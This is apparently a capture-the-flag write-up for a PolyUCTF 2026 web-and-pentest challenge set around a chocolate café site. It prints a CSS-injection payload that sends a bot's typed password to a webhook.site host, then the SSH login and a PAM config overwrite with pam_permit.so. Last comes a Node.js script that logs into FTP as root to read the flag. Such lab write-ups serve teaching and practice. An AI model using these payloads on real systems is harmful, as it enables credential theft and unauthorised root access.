#import "setup.typ": format, center, right, title
#show: format

#set document(
    title: [Cioccolato\ PolyUCTF 2026]
)

#set heading(numbering: "1.")

#line(length: 100%)

#title()

#line(length: 100%)

= Preface

Challenge authored by Cynthia. Huge respects to her for writing pentest challenges!

499 pts.

#set quote(block: true)

#quote[
Chocolateeeeeee 

I heard that the head chocolatier, Giovanni, from my favorite chocolate café has a hidden recipe...

I know you’re the strongest hacker in the world — it should be a piece of chocolate cake for you to retrieve the recipe, right?~

https://www.youtube.com/watch?v=PKQPey6L42M

Goal: chal.polyuctf.com

P.S. Multiple services are running on the same port.
]

= Reconnaissance

The challenge serves a chocolate café website on a single port `chal.polyuctf.com:12287`. The description "Multiple services are running on the same port" indicates protocol multiplexing, likely via #link("https://github.com/yrutschle/sslh")[sslh].

We can verify this by probing the port with `curl` (HTTP) and `ssh`.

```bash
$ curl http://chal.polyuctf.com:12287/
# → "Cioccolato Bear" — Italian chocolate café (Express 5.2.1 behind nginx)

$ ssh -p 12287 barista@chal.polyuctf.com
# → OpenSSH 9.2p1 Debian (same port!)
```

This confirms that port 12287 multiplexes both HTTP and SSH traffic.

Browsing the site reveals standard pages (`/about`, `/menu`, `/team`, `/locations`, `/contact`, `/reservations`), plus two interesting paths:

- `/portal`: A staff portal page referencing an API endpoint.
- `/api/cioccolato_staff/:id`: An IDOR vulnerability that requires no authentication.

= Staff Enumeration

Enumerating the staff API revealed the following users:
The first user is *Giovanni*, the Head Chocolatier. His workspace is `giovanni-notes-2024`. His notes contain a critical hint: "Gave barista remote access... Auto-login script runs every few minutes to check the recipe notepad." This suggests a client-side exploitation vector involving a bot.

The second user is *guest*, a Visitor with access to `public-recipes`.

The third user is *barista*, a Junior Barista with no workspace.

= CSS Injection + Password Exfiltration

Visiting `/workspace/giovanni-notes-2024` reveals a recipe notepad page with an `<input id="notepad">`. The page loads `/assets/cb-ui.min.js`:

```javascript
// Deobfuscated cb-ui.min.js
document.addEventListener("DOMContentLoaded", function() {
  var e = document.getElementById("notepad");
  if (!e) return;
  e.addEventListener("input", function() {
    this.setAttribute("value", this.value);
    var u = getComputedStyle(this).getPropertyValue("--x").trim();
    if (u) new Image().src = u + encodeURIComponent(this.value);
  });
});
```

On every keystroke, the script reads a CSS custom property `--x` from the notepad element and fires an image request to `url + encodeURIComponent(value)`. The Content Security Policy (CSP) allows `img-src *`, permitting unrestricted cross-origin image loads.

The workspace also has a *theme customization* endpoint:

```http
POST /api/workspace/giovanni-notes-2024/theme
Content-Type: application/x-www-form-urlencoded

css=#notepad { --x: https://webhook.site/<token>?r=; }
```

The server-side CSS sanitizer strips HTML tags, `javascript:`, and event handlers, but allows custom properties.

== The Attack

1. Create a webhook.site token.
2. Inject CSS via the theme endpoint:
   ```css
   #notepad { --x: https://webhook.site/<token>?r=; }
   ```
3. Wait for Giovanni's bot to visit the workspace and type into the notepad.
4. Each keystroke triggers: `new Image().src = "https://webhook.site/<token>?r=" + encodeURIComponent(currentValue)`
5. Webhook captures the cumulative value on each keystroke.

The bot types character by character. Webhook requests show the password building up:

#image("webhook-cioccollato.png")

```
?r=B
?r=B4
?r=B4r
?r=B4r1
...
?r=B4r1st4_C0ff33_2024!
```

*Exfiltrated password:* `B4r1st4_C0ff33_2024!`

= SSH Access

Since the same port serves SSH via `sslh`, we can use the credentials to log in.

```bash
ssh -p 12287 barista@chal.polyuctf.com
```

We are logged in as `barista` (uid 1001).

== Filesystem Exploration

```
/srv/ftp/.secret/flag.txt   → -r-------- root:root  70 bytes  ← THE FLAG
/srv/ftp/recipes/.backups/.credentials.bak  → "Nice try ;) - Try harder!"  (red herring)
/app/server.js              → Express app, 988 lines, pure in-memory (no fs/child_process)
/etc/vsftpd.conf            → vsftpd 3.0.3 on 127.0.0.1:2121, seccomp_sandbox=NO
```

The flag is root-only readable. No SUID binaries, no sudo, no capabilities, no cron jobs. Standard privilege escalation vectors are not applicable.

= Privilege Escalation via Writable PAM Config

Searching for writable files owned by root reveals a misconfiguration:

```bash
$ find / -user root -writable 2>/dev/null | grep -v "/proc\|/sys\|/dev"
/etc/pam.d/vsftpd
```

*`/etc/pam.d/vsftpd` is world-writable (`-rw-rw-rw-`)!*

The original config enforces `/etc/ftpusers` (blocks root) and password verification. By replacing it with `pam_permit.so`, we bypass all authentication checks:

```bash
cat > /etc/pam.d/vsftpd << 'EOF'
auth    sufficient  pam_permit.so
account sufficient  pam_permit.so
session sufficient  pam_permit.so
EOF
```

Now *any user* can FTP in with *any password*, including root.

= FTP as Root → Flag

Since only Node.js is available on the container, we use it to perform a proper FTP PASV retrieval.

```javascript
const net = require("net");
const client = net.connect(2121, "127.0.0.1", () => {
  let buf = "";
  client.on("data", (data) => {
    buf += data.toString();
    const lines = buf.split("\n");
    for (let i = 0; i < lines.length - 1; i++) {
      const line = lines[i].trim();
      if (line.startsWith("220")) client.write("USER root\r\n");
      else if (line.startsWith("331")) client.write("PASS x\r\n");
      else if (line.startsWith("230")) client.write("PASV\r\n");
      else if (line.startsWith("227")) {
        const m = line.match(/\((\d+),(\d+),(\d+),(\d+),(\d+),(\d+)\)/);
        const port = parseInt(m[5]) * 256 + parseInt(m[6]);
        const host = m.slice(1, 5).join(".");
        const dc = net.connect(port, host, () => {
          client.write("RETR .secret/flag.txt\r\n");
        });
        dc.on("data", (d) => process.stdout.write(d.toString()));
        dc.on("end", () => client.write("QUIT\r\n"));
      }
      else if (line.startsWith("221")) client.end();
    }
    buf = lines[lines.length - 1];
  });
});
```

Running this script retrieves the flag:

```
230 Login successful.
150 Opening BINARY mode data connection for .secret/flag.txt (70 bytes).
PUCTF26{Tr1pl3_Ch0c0l4t3_1s_Th3_B3st_2Q1WUFjr6v3W9iuUjuwFqPDzQvrhCPcM}
226 Transfer complete.
```

#line(length: 100%)
